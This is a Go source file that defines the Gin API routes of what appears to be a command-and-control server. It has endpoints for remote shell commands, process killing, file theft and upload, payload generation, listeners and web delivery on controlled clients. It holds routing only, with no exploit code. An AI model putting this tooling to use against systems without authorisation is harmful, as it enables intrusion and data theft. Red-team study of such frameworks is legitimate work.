package api

import (
	"embed"
	"html/template"
	"io/fs"
	"net/http"

	"github.com/gin-gonic/gin"
)

// SetupRoutes 配置所有路由
func SetupRoutes(r *gin.Engine, embedFS embed.FS) {
	// 配置中间件
	r.Use(CorsMiddleware())
	r.Use(gin.Logger())
	r.Use(gin.Recovery())

	// 配置静态文件和模板
	setupStaticFiles(r, embedFS)

	// 配置Basic认证中间件
	r.Use(BasicAuthMiddleware())

	// 公开路由（不需要JWT认证）
	setupPublicRoutes(r)

	// 受保护的路由（需要JWT认证）
	setupProtectedRoutes(r)
}

// setupStaticFiles 配置静态文件和模板
func setupStaticFiles(r *gin.Engine, embedFS embed.FS) {
	// 创建嵌入文件系统
	distFS, _ := fs.Sub(embedFS, "dist")
	staticFs, _ := fs.Sub(distFS, "static")
	// 提供静态文件，文件夹是 ./static
	r.StaticFS("/static/", http.FS(staticFs))

	// 引入html
	r.SetHTMLTemplate(template.Must(template.New("").ParseFS(embedFS, "dist/*.html")))

	// 处理未匹配的路由
	r.NoRoute(func(c *gin.Context) {
		c.HTML(http.StatusOK, "index.html", nil)
	})
}

// setupPublicRoutes 配置公开路由
func setupPublicRoutes(r *gin.Engine) {
	a := r.Group("/api")
	{
		// 登录
		a.POST("/users/login", LoginHandler)
	}
}

// setupProtectedRoutes 配置受保护的路由
func setupProtectedRoutes(r *gin.Engine) {
	// 使用 JWT 中间件保护以下路由
	protected := r.Group("/api")
	protected.Use(AuthMiddleware())

	// 用户相关路由
	setupUserRoutes(protected)

	// 客户端相关路由
	setupClientRoutes(protected)

	// 监听器相关路由
	setupListenerRoutes(protected)

	// Web交付相关路由
	setupWebDeliveryRoutes(protected)
}

// setupUserRoutes 配置用户相关路由
func setupUserRoutes(protected *gin.RouterGroup) {
	// 注销
	protected.POST("/users/logout", LogoutHandler)

	// 修改密码
	protected.POST("/users/user_setting/ChangePassword", ChangePasswordHandler)
}

// setupClientRoutes 配置客户端相关路由
func setupClientRoutes(protected *gin.RouterGroup) {
	// 客户端列表和基本操作
	protected.GET("/client/clientslist", GetClients)
	protected.GET("/client/exit", ExitClient)
	protected.POST("/client/addnote", AddUidNote)
	protected.POST("/client/sleep", EditSleep)
	protected.POST("/client/color", EditColor)
	protected.POST("/client/GenServer", GenServer)
	protected.GET("/client/listener/list", ShowListener)

	// Shell相关
	protected.POST("/client/shell/sendcommand", SendCommands)
	protected.GET("/client/shell/getshellcontent", GetShellContent)

	// 进程相关
	protected.GET("/client/pid", GetPidList)
	protected.POST("/client/pid/kill", KillPid)

	// 文件相关
	protected.POST("/client/file/tree", FileBrowse)
	protected.POST("/client/file/delete", FileDelete)
	protected.POST("/client/file/mkdir", MakeDir)
	protected.POST("/client/file/upload", FileUpload)
	protected.POST("/client/file/download", DownloadFile)
	protected.GET("/client/file/drives", ListDrives)
	protected.POST("/client/file/filecontent", FetchFileContent)

	// 笔记相关
	protected.GET("/client/note/get", GetNote)
	protected.POST("/client/note/save", SaveNote)

	// 下载相关
	protected.GET("/client/downloads/info", GetDownloadsInfo)
	protected.POST("/client/downloads/downloaded_file", DownloadDownloadedFile)
}

// setupListenerRoutes 配置监听器相关路由
func setupListenerRoutes(protected *gin.RouterGroup) {
	protected.POST("/listener/add", AddListener)
	protected.GET("/listener/list", ListListener)
	protected.POST("/listener/open", OpenListener)
	protected.POST("/listener/close", CloseListener)
	protected.POST("/listener/delete", DeleteListener)
}

// setupWebDeliveryRoutes 配置Web交付相关路由
func setupWebDeliveryRoutes(protected *gin.RouterGroup) {
	protected.GET("/webdelivery/list", ListWebDelivery)
	protected.POST("/webdelivery/start", StartWebDelivery)
	protected.POST("/webdelivery/close", CloseWebDelivery)
	protected.POST("/webdelivery/open", OpenWebDelivery)
	protected.POST("/webdelivery/delete", DeleteWebDelivery)
}